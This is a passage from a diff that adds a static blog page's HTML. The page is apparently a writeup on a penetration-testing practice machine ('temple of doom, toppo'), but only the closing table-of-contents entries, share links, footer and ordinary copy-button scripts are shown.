href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell-1"><span class="toc-number">2.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&text=靶机渗透(temple of doom,toppo)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&is_video=false&description=靶机渗透(temple of doom,toppo)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透(temple of doom,toppo)&body=Check out this article: http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&name=靶机渗透(temple of doom,toppo)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&t=靶机渗透(temple of doom,toppo)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
